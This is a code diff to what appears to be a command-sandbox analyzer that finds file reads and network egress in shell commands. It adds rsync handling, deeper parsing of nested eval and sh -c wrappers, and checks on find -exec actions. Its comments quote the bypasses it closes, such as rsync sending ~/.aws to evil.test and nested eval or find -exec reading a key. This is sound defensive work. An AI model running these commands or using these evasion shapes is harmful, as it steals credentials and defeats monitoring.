@@ -2069,6 +2069,60 @@ export const NET_BINARIES = new Set([
 // missing a rare one only risks a false destination candidate (which is review,
 // not block, by default), never a missed real host.
 const VALUE_FLAGS: Record<string, Set<string>> = {
+  // rsync 3.2.7, its own --help: every flag whose operand could be mistaken for
+  // a host. `-e ssh` is the one that matters most (`ssh` is not the destination).
+  rsync: new Set([
+    '-e',
+    '--rsh',
+    '-f',
+    '--filter',
+    '-T',
+    '--temp-dir',
+    '-B',
+    '--block-size',
+    '-M',
+    '--remote-option',
+    '--exclude',
+    '--exclude-from',
+    '--include',
+    '--include-from',
+    '--files-from',
+    '--compare-dest',
+    '--copy-dest',
+    '--link-dest',
+    '--partial-dir',
+    '--log-file',
+    '--password-file',
+    '--bwlimit',
+    '--timeout',
+    '--contimeout',
+    '--port',
+    '--sockopts',
+    '--address',
+    '--chmod',
+    '--chown',
+    '--max-size',
+    '--min-size',
+    '--modify-window',
+    '--out-format',
+    '--log-file-format',
+    '--backup-dir',
+    '--suffix',
+    '--iconv',
+    '--max-delete',
+    '--checksum-choice',
+    '--info',
+    '--debug',
+    '--stderr',
+    '--outbuf',
+    '--skip-compress',
+    '--usermap',
+    '--groupmap',
+    '--mkpath',
+    '--write-batch',
+    '--read-batch',
+    '--only-write-batch',
+  ]),
   curl: new Set([
     '-d',
     '--data',
@@ -2200,8 +2254,15 @@ function resolveWordLiteral(w: any): string | null {
       // A plain `$HOME` inside double quotes is the same home directory.
       if (!inner.every((ip: unknown) => syntax.NodeType(ip) === 'Lit' || plainHomeExpansion(ip)))
         return null;
+      // Inside double quotes bash honours exactly four escapes: \$ \` \" \\.
+      // Dropping them left `eval "eval \"cat KEY\""` re-parsed with literal
+      // backslashes, so the inner wrapper was never read (stage 6, JAIL-1). `\.`
+      // and every other backslash stay as written, which is what a regex in
+      // double quotes needs.
       s += inner
-        .map((ip: { Value?: string }) => (plainHomeExpansion(ip) ? '~' : (ip.Value ?? '')))
+        .map((ip: { Value?: string }) =>
+          plainHomeExpansion(ip) ? '~' : (ip.Value ?? '').replace(/\\([$`"\\])/g, '$1')
+        )
         .join('');
     } else {
       return null; // dynamic
@@ -2286,7 +2347,11 @@ function destTokensForBinary(binary: string, args: (string | null)[]): string[] 
       // First positional is [user@]host; the rest is the remote command.
       return positionals.slice(0, 1);
     case 'scp':
-      // Remote specs contain a ':' (host:path); local paths usually don't.
+    case 'rsync':
+      // Remote specs contain a ':' (host:path) or an `rsync://` scheme; local
+      // paths usually don't. Stage 6 (JAIL-8): rsync joined NET_BINARIES on
+      // 2026-09-11 with no arm here, so `rsync -av ~/.aws evil.test:/x` yielded
+      // no destination and neither egress nor the SSRF floor ever saw it.
       return positionals.filter((p) => p.includes(':') || p.includes('@'));
     case 'nc':
     case 'ncat':
@@ -2694,7 +2759,14 @@ function analyzeFsOperationImpl(command: string, depth = 0): FsOpVerdict | null 
       // is one literal word; the only honest treatment is to re-parse it, once.
       // A dynamic payload (ParamExp / CmdSubst) resolves to null and is left to
       // detectDangerousShellExec + the Class B evalDynamic knob.
-      if (depth < 1) {
+      // Stage 6 (JAIL-1): three levels, not one. `eval "eval \"cat KEY\""` and
+      // `sh -c "sh -c \"cat KEY\""` were ALLOW because exactly one wrapper was
+      // re-parsed; the bound was arbitrary and nobody had measured two. Three
+      // covers every shape in the exfil corpus and `sudo sh -c "bash -c '...'"`,
+      // and it STAYS a bound: a pathological nesting must not become a parse
+      // loop. The fourth level is pinned as the accepted limit in
+      // jail-nested-wrappers.spec.ts, verdict stated rather than hidden.
+      if (depth < 3) {
         const payload = literalShellPayload(words, name);
         if (payload !== null) {
           const inner = analyzeFsOperationImpl(payload, depth + 1);
@@ -2870,6 +2942,17 @@ const FIND_OPTIONS = new Set(['-H', '-L', '-P']);
  * first predicate (a dash word that is not a find option). Shared by the read
  * tier (wrappedReadPaths) and the copy tier, so the find grammar lives once.
  */
+/**
+ * The words of find's -exec ACTION: everything after the flag at `k`, up to the
+ * terminating `;` (the user types `\;`, which resolves to `;`) or `+`, with the
+ * `{}` placeholder removed because it is not a path. A predicate after the
+ * terminator (`\; -print`) is find's again and is not part of the action.
+ */
+function findAction(words: (string | null)[], k: number): (string | null)[] {
+  const end = words.findIndex((w, i) => i > k && (w === ';' || w === '+'));
+  return words.slice(k + 1, end < 0 ? words.length : end).filter((w) => w !== '{}');
+}
+
 function findStartPoints(words: (string | null)[], h: number): { k: number; starts: string[] } {
   const k = words.findIndex((w, i) => i > h && w !== null && FIND_EXEC_FLAGS.has(w));
   if (k < 0) return { k, starts: [] };
@@ -2900,8 +2983,14 @@ function copySourcePaths(words: (string | null)[]): string[] {
   if (fi >= 0) {
     const { k, starts } = findStartPoints(words, fi);
     if (k < 0) return [];
-    const action = unwrapCommandHead(words.slice(k + 1));
-    return resolveCopyShape(words.slice(k + 1), action) ? starts : [];
+    const action = findAction(words, k);
+    const head = unwrapCommandHead(action);
+    // The start points are copied only when the action IS a copy verb; the
+    // action's own literal sources are judged either way (stage 6, JAIL-11:
+    // `find . -exec cp KEY /tmp/k \;` was ALLOW). The slice has no `find` in it,
+    // so the recursion takes the ordinary path.
+    const own = resolveCopyShape(action, head) ? copySourcePaths(action) : [];
+    return resolveCopyShape(action, head) ? [...starts, ...own] : own;
   }
   // Cheap exit for the ~99% of CallExprs whose head is no copy verb.
   if (!COPY_VERB_HEADS.has(baseWord(words[h]))) return [];
@@ -3492,7 +3581,24 @@ function flagOperandFiles(verb: string, words: (string | null)[], from: number):
 function wrappedReadPaths(words: (string | null)[], name: string): string[] | null {
   if (name === 'find') {
     const { k, starts } = findStartPoints(words, 0);
-    return k > 0 && isReaderWord(words[k + 1] ?? null) ? starts : null;
+    if (k < 0) return null;
+    // Stage 6 (JAIL-11): the action's OWN words. Until now this branch judged
+    // find's start points and looked at the reader after -exec, and never at the
+    // literal words of the action itself, so `find . -exec cat KEY \;` was ALLOW
+    // and JAIL-10's `=` table never reached it. The action is the slice after
+    // -exec up to `;` or `+`, with `{}` removed, and it gets exactly what an
+    // ordinary command gets: unwrap the head, then the reader's own targets.
+    const action = findAction(words, k);
+    const h = unwrapCommandHead(action);
+    const head = baseWord(action[h]);
+    if (!isReaderWord(action[h] ?? null)) return null;
+    const rest = action.slice(h + 1);
+    const restFlags = rest.filter((w): w is string => w !== null && w.startsWith('-'));
+    return [
+      ...starts,
+      ...readTargets(head, positionedArgs(action, h + 1), restFlags, action, h + 1),
+      ...flagOperandFiles(head, action, h + 1),
+    ];
   }
   if (!COMMAND_WRAPPERS.has(name) && !RUNNER_WRAPPERS.has(name)) return null;
   const h = unwrapCommandHead(words);
